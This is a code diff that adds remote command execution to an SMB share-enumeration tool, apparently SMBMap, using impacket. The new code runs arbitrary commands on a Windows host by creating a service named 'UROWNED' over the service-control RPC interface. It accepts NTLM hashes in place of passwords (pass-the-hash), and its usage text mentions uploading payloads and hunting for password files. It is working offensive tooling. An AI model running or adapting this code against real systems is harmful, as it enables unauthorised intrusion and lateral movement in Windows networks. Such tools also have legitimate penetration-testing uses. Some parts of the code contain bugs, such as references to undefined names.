@@ -7,11 +7,137 @@ from impacket import smb, version, smb3, nt_errors
 from impacket.dcerpc.v5 import samr, transport, srvs
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.smbconnection import *
+from impacket.dcerpc import transport, svcctl, srvsvc
 import argparse
 import ntpath
 import cmd
 import os
 
+OUTPUT_FILENAME = '__output'
+BATCH_FILENAME  = 'execute.bat'
+SMBSERVER_DIR   = '__tmp'
+DUMMY_SHARE     = 'TMP'
+
+class RemoteShell():
+    def __init__(self, share, rpc, mode, serviceName, command):
+        self.__share = share
+        self.__mode = mode
+        self.__output = '\\' + OUTPUT_FILENAME
+        self.__batchFile = '\\' + BATCH_FILENAME
+        self.__outputBuffer = ''
+        self.__command = command
+        self.__shell = '%COMSPEC% /Q /c '
+        self.__serviceName = serviceName
+        self.__rpc = rpc
+
+        dce = rpc.get_dce_rpc()
+        try:
+            dce.connect()
+        except Exception, e:
+            print e
+            sys.exit(1)
+
+        s = rpc.get_smb_connection()
+
+        # We don't wanna deal with timeouts from now on.
+        s.setTimeout(100000)
+        dce.bind(svcctl.MSRPC_UUID_SVCCTL)
+        self.rpcsvc = svcctl.DCERPCSvcCtl(dce)
+        resp = self.rpcsvc.OpenSCManagerW()
+        self.__scHandle = resp['ContextHandle']
+        self.transferClient = rpc.get_smb_connection()
+        self.send_data(self.__command)
+
+    def finish(self):
+        # Just in case the service is still created
+        try:
+           dce = self.__rpc.get_dce_rpc()
+           dce.connect()
+           dce.bind(svcctl.MSRPC_UUID_SVCCTL)
+           self.rpcsvc = svcctl.DCERPCSvcCtl(dce)
+           resp = self.rpcsvc.OpenSCManagerW()
+           self.__scHandle = resp['ContextHandle']
+           resp = self.rpcsvc.OpenServiceW(self.__scHandle, self.__serviceName)
+           service = resp['ContextHandle']
+           self.rpcsvc.DeleteService(service)
+           self.rpcsvc.StopService(service)
+           self.rpcsvc.CloseServiceHandle(service)
+        except Exception, e:
+            print e
+            pass
+
+    def get_output(self):
+        def output_callback(data):
+            self.__outputBuffer += data
+
+        self.transferClient.getFile(self.__share, self.__output, output_callback)
+        self.transferClient.deleteFile(self.__share, self.__output)
+
+    def execute_remote(self, data):
+        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile
+        command += ' & ' + 'del ' + self.__batchFile
+
+        resp = self.rpcsvc.CreateServiceW(self.__scHandle, self.__serviceName, self.__serviceName, command.encode('utf-16le'))
+        service = resp['ContextHandle']
+        try:
+           self.rpcsvc.StartServiceW(service)
+        except:
+           pass
+        self.rpcsvc.DeleteService(service)
+        self.rpcsvc.CloseServiceHandle(service)
+        self.get_output()
+
+    def send_data(self, data):
+        self.execute_remote(data)
+        print self.__outputBuffer
+        self.__outputBuffer = ''
+
+class CMDEXEC:
+    KNOWN_PROTOCOLS = {
+        '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
+        '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
+        }
+
+
+    def __init__(self, protocols = None,
+                 username = '', password = '', domain = '', hashes = None, share = None, command = None):
+        if not protocols:
+            protocols = PSEXEC.KNOWN_PROTOCOLS.keys()
+
+        self.__username = username
+        self.__password = password
+        self.__protocols = [protocols]
+        self.__serviceName = 'UROWNED'.encode('utf-16le')
+        self.__domain = domain
+        self.__lmhash = ''
+        self.__nthash = ''
+        self.__share = share
+        self.__mode  = 'SHARE'
+        self.__command = command
+        if hashes is not None:
+            self.__lmhash, self.__nthash = hashes.split(':')
+
+    def run(self, addr):
+        for protocol in self.__protocols:
+            protodef = CMDEXEC.KNOWN_PROTOCOLS[protocol]
+            port = protodef[1]
+
+            stringbinding = protodef[0] % addr
+
+            rpctransport = transport.DCERPCTransportFactory(stringbinding)
+            rpctransport.set_dport(port)
+
+            if hasattr(rpctransport,'preferred_dialect'):
+               rpctransport.preferred_dialect(SMB_DIALECT)
+            if hasattr(rpctransport, 'set_credentials'):
+                # This method exists only for selected protocol sequences.
+                rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+            try:
+                self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName, self.__command)
+            except  (Exception, KeyboardInterrupt), e:
+                print e
+                sys.stdout.flush()
+                sys.exit(1)
 
 class SMBMap():
 
@@ -28,6 +154,7 @@ class SMBMap():
         self.username = username
         self.password = password
         self.domain = domain
+        self.host = host
         
         try:
             self.smbconn = SMBConnection(host, host, sess_port=self.port)
@@ -247,9 +374,14 @@ class SMBMap():
             os.remove(filename)
         out.close()
     
-    def exec_command(self, command):
-        pass
-    
+    def exec_command(self, share, command):
+        if self.is_ntlm(self.password):
+            hashes = password
+        else:
+            hashes = None 
+        executer = CMDEXEC('445/SMB', self.username, self.password, self.domain, hashes, share, command)
+        executer.run(self.host)   
+ 
     def delete_file(self, path):
         path = string.replace(path,'/','\\')
         path = ntpath.normpath(path)
@@ -290,12 +422,16 @@ class SMBMap():
             sys.exit()
 
     def is_ntlm(self, password):
-       if len(password.split(':')) == 2:
-            lm, ntlm = password.split(':')
-            if len(lm) == 32 and len(ntlm) == 32:
-                return True
-            else: 
-                return False
+        try:
+            if len(password.split(':')) == 2:
+                print 'ntlm, perhaps'
+                lm, ntlm = password.split(':')
+                if len(lm) == 32 and len(ntlm) == 32:
+                    return True
+                else: 
+                    return False
+        except Exception as e:
+            return False
 
     def get_version(self):
         try:
@@ -329,17 +465,19 @@ def usage():
     print ''
     print '-h\t\tHostname or IP'
     print '-u\t\tUsername, if omitted null session assumed'
-    print '-p\t\t\'Password\' (or NTLM hash)' 
-    print '-d\t\tDomain name'
-    print '-R\t\t\'C$\\finance\' (Recursively list dirs, and files, no share\path lists ALL shares)'
+    print '-p\t\tPassowrd or NTLM hash' 
+    print '-s\t\tShare to use for smbexec command output (default C$), ex \'C$\''
+    print '-x\t\tExecute a command, ex. \'ipconfig /r\''
+    print '-d\t\tDomain name (default WORKGROUP)'
+    print '-R\t\tRecursively list dirs, and files (no share\path lists ALL shares), ex. \'C$\\Finance\''
     print '-r\t\tList contents of root only'
     print '-f\t\tFile name filter, -f "password"'
     print '-F\t\tFile content filter, -f "password"'
-    print '-D\t\t\'C$\\temp\\passwords.txt\' (download path)'
-    print '--upload-src\t\t/temp/payload.exe  (note that this requires --upload-dst for a destiation share)'
-    print '--upload-dst\t\tC$\\temp\\payload.exe (destination upload path)'
-    print '--del\t\tC$\\temp\\msf.exe (delete a file)'
-    print '--skip\t\tSkip delete confirmation prompt'
+    print '-D\t\tDownload path, ex. \'C$\\temp\\passwords.txt\''
+    print '--upload-src\tFile upload source, ex \'/temp/payload.exe\'  (note that this requires --upload-dst for a destiation share)'
+    print '--upload-dst\tUpload destination on remote host, ex \'C$\\temp\\payload.exe\''
+    print '--del\t\tDelete a remote file, ex. \'C$\\temp\\msf.exe\''
+    print '--skip\t\tSkip delete file confirmation prompt'
     print ''
     sys.exit()
      
@@ -361,6 +499,8 @@ if __name__ == "__main__":
     delFile = False
     lsshare = False 
     lspath = False
+    command= False
+    share = False
     skip = None
     user = ''
     passwd = ''
@@ -377,12 +517,16 @@ if __name__ == "__main__":
                 continue
         if val == '-u':
             user = sys.argv[counter+1]
+        if val == '-x':
+            command = sys.argv[counter+1]
         if val == '-p':
             passwd = sys.argv[counter+1]
         if val == '-d':
             domain = sys.argv[counter+1]
         if val == '-h':
             ipArg = sys.argv[counter+1]
+        if val == '-s':
+            share = sys.argv[counter+1]
         if val == '-D':
             try:
                 dlPath = sys.argv[counter+1]
@@ -408,7 +552,10 @@ if __name__ == "__main__":
         counter+=1
 
     choice = ''  
-  
+
+    if command and not share:
+        share = 'C$'
+
     if delFile and skip == None: 
         valid = ['Y','y','N','n'] 
         while choice not in valid:
@@ -473,7 +620,7 @@ if __name__ == "__main__":
             mysmb.login(user, passwd, domain, key)
         
         print '[+] IP: %s:%d\tName: %s' % (key, host[key]['port'], host[key]['name'].ljust(50))
-        if not dlPath and not src and not delFile:        
+        if not dlPath and not src and not delFile and not command:        
             print '\tDisk%s\tPermissions' % (' '.ljust(50))
             print '\t----%s\t-----------' % (' '.ljust(50))
 
@@ -489,6 +636,10 @@ if __name__ == "__main__":
 
             if delFile:
                 mysmb.delete_file(delFile)
+                sys.exit()
+            
+            if command:
+                mysmb.exec_command(share, command)
                 sys.exit()
 
             shareList = [lsshare] if lsshare else mysmb.list_shares(False)
@@ -538,4 +689,7 @@ if __name__ == "__main__":
 
         except Exception as e:
             print e
+            exc_type, exc_obj, exc_tb = sys.exc_info()
+            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+            print(exc_type, fname, exc_tb.tb_lineno)
             sys.exit() 
